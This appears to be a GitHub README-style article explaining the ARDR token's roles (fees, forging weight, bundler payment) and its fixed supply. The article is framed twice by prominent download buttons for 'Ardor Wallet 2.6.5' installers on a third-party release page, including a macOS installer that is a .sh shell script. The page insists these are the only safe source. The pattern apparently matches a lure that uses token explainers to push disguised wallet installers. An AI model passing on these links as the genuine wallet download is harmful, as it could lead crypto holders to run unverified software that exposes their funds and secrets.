![Ardor Wallet guide](assets/banner-article.png)

# What the ARDR token is, what it pays for, and what its fixed supply means

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

ARDR is the parent chain token of the Ardor platform. It pays parent chain transaction fees, it is the balance that forging power is measured in, and it is what bundlers spend when they wrap child chain transactions. Its supply was fixed at launch, and forging pays out fees rather than new coins.

## Three jobs, one token

ARDR is not a governance token and not a share. It has a narrow, mechanical role, and understanding the three jobs explains most of the questions people ask about it.

| Job | How it works |
|---|---|
| Fees on the parent chain | A transaction sent directly on Ardor pays its fee in ARDR |
| Forging weight | An account's effective balance, held for a period, determines its chance of forging a block |
| Bundler payment | A bundler pays ARDR to include child chain bundles on the parent chain |

Everything else on the platform - [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) transactions, issued assets, marketplace listings - runs beside ARDR rather than replacing it. That is why a user can spend a whole day in Ignis without ever holding ARDR, while the security underneath is still paid for in ARDR by the bundler.

## Why a child chain user may never touch ARDR

A [bundler](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md) accepts fees in a child chain's own token and pays the parent chain in ARDR. From the user's side, the transaction simply costs the child chain token. From the network's side, the ARDR fee was paid, just not by that user.

This is a design choice with a visible consequence: onboarding to a child chain does not require acquiring a second asset. The trade-off is dependence on bundlers, which are a service rather than a protocol requirement, and which have their own minimum rate and [fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) limit settings.

## Fixed supply and what it implies

The supply was set at launch and there is no block subsidy. [Forging](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) therefore redistributes existing coins rather than minting new ones, and the only thing a forger earns is the fees in the blocks they produce.

That has two implications worth stating plainly. First, there is no inflation curve to model and no halving schedule to anticipate. Second, the security budget scales with usage rather than with a fixed issuance - a busier chain pays forgers more, a quiet chain pays less. Anyone presenting ARDR as a yield-bearing asset is describing a mechanism the protocol does not have.

## Effective balance, not balance

Forging weight follows effective balance rather than the figure shown as available. Effective balance is what counts towards forging and what can be leased out; the available figure is what you can actually move.

Confusing the two produces the most common forging complaint: an account that holds coins and still does not forge, or one that has leased its balance and believes the coins have moved. A lease moves forging power, not funds, and the owner keeps spending control throughout.

## Holding ARDR safely

ARDR is a bearer asset: whoever holds the secret holds the coins, and there is no issuer to call. The practical rules follow from that.

- Keep the secret offline and written down, not in a synced note or a photo.
- Publish the public key on an account that has sat idle, so a colliding secret cannot claim the abbreviated address later.
- Use a hardware device for a balance large enough that a lost laptop would matter.
- Treat every offer to "recover", "migrate" or "stake" ARDR as theft until proven otherwise; none of those services exist.

## Fees in practice

A parent chain transaction needs ARDR in the account, and the wallet's send dialog computes the fee before you sign. A child chain transaction needs the child chain's own token, with the ARDR fee paid by a bundler on your behalf. Between the two, the only situation that requires holding ARDR is acting directly on the parent chain: receiving, sending, forging or leasing there.

That is a narrower requirement than most people expect from a platform token. It also explains why a wallet can show a healthy Ignis balance and an ARDR balance of zero at the same time, and why that combination is not a problem to fix.

## What ARDR is not

It is not a governance token, not a share in a company and not a yield product. Holding it confers no vote, no dividend and no claim on revenue. Its role is mechanical: fees, forging weight and bundler payment.

Nothing in that description supports a price view, and this page does not offer one. The token's usefulness follows the network's use of the parent chain, which is a statement about mechanics rather than a forecast.

## Where ARDR sits among the child chains

The parent chain is deliberately quiet. It carries the bundles, the forging and a small number of platform-level transactions, while the activity happens on the child chains. That division keeps the security ledger small and the feature chains free to change.

For a holder, the arrangement means ARDR is best understood as the network's fee and security asset rather than as a token with a product attached. The products are the child chains, the asset exchange, the marketplace and the rest, and they are reachable from the same wallet with the same secret.

## FAQ

### Does ARDR pay a dividend or a yield?

No. Forging collects the fees attached to the blocks you produce, and holders receive no dividend, no staking reward and no issuance.

### Do I need ARDR to use Ignis?

Not necessarily. A bundler can pay the parent chain fee for a child chain transaction, so the user only needs the child chain token.

### How much ARDR do I need to forge?

Enough ARDR to hold the minimum effective balance through the waiting period on a live node. The forging requirements article gives the exact figures and the leasing alternative.

### Is the ARDR supply inflationary?

No. The supply was fixed at launch, and forging redistributes fees rather than creating coins.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the Ardor blockchain is, how it works, and what else is called Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ardor-blockchain-platform.md)
- [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md)
- [How much ARDR you need to forge](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [How Ardor bundling works](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
